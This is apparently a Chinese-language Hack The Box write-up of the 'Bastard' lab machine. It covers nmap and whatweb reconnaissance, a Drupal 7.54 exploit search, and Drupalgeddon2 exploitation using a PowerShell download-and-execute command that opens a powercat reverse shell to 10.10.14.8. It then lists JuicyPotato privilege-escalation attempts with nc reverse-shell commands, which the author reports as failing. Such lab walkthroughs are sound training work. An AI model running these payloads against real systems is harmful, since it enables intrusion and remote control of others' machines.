# 扫描

```shell
┌──(tel㉿kali-linux-2022-2-arm64)-[/tools/impacket]
└─$ sudo nmap --min-rate 10000 -p- 10.10.10.9
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-07 11:54 CST
Nmap scan report for 10.10.10.9
Host is up (0.25s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.88 seconds

┌──(tel㉿kali-linux-2022-2-arm64)-[/tools/impacket]
└─$ sudo nmap -sC -sV -p80,135,49154 10.10.10.9
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-07 11:55 CST
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 11:56 (0:00:21 remaining)
Nmap scan report for 10.10.10.9
Host is up (0.25s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.39 seconds
```

扫描到存在 robots.txt 打开来看

![](https://pic.l1nyz-tel.cc/202308071322847.png)

此处简单测了一下有无文件包含，很遗憾，结果是没有

![](https://pic.l1nyz-tel.cc/202308071320147.png)

# Web Pentest

whatweb 查看网站指纹，可以发现存在 Drupal 7

```shell
┌──(tel㉿kali-linux-2022-2-arm64)-[~]
└─$ whatweb 'http://10.10.10.9'
http://10.10.10.9 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
```

从 robots.txt 中获取到网站的更多信息 Drupal 7.54

![](https://pic.l1nyz-tel.cc/202308071326599.png)

此时可以使用 kali 漏洞库对此漏洞进行查询

```bash
┌──(tel㉿kali-linux-2022-2-arm64)-[~]
└─$ searchsploit 'Drupal 7.54'
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)       | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)       | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)    | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Exec | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Me | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Me | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Po | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                 | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                             | php/webapps/46459.py
------------------------------------------------------------------------------- ---------------------------------                                                                                                | php/webapps/46459.py
```

选择符合条件漏洞 cve 进行测试

## Drupalgeddon2

可以使用 msfconsole 发现确实存在 Drupalgeddon2 漏洞，但是没法使用 msfconsole 直接打通

![](https://pic.l1nyz-tel.cc/202308071344151.png)

直接打不了，那就另外找脚本吧，选择 dump 下 searchsploit 上几份脚本来进行攻击，也不太行

但是使用 [github](https://github.com/lorddemon/drupalgeddon2) 找到的脚本，效果就很好了

```bash
┌──(tel㉿kali-linux-2022-2-arm64)-[~/Documents/Htb-Bastard/drupalgeddon2]
└─$ python2 drupalgeddon2.py -h http://10.10.10.9/ -c "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.8:1234/powercat.ps1');powercat -c 10.10.14.8 -p 4444 -e cmd"
```

反弹 shell 之后，可以在目录 `C:\Users\dimitris\Desktop>type user.txt` 获取 flag

# 提权

查看网卡，也没有发现有其他内网地址，尝试本地先提权吧

```bash
Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.10.9
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{56FEC108-3F71-4327-BF45-2B4EE355CD0F}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

尝试上线到 msfconsole，却一直不行

systeminfo 提示版本是 Windows_Server_2008_R2_Enterprise，挺老的版本了，而且没啥补丁，找到对应的漏洞即可以打

但是一直打不通，后面直接抄 payload 也没通

```bash
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.14.8 5555" -t \* -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.14.8 5555" -t \* -c '{C49E32C6-BC8B-11d2-85D4-00105A1F8304}'

JuicyPotato.exe -l 9000 -p C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -t * -c '{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}' -a "-c whoami"
```
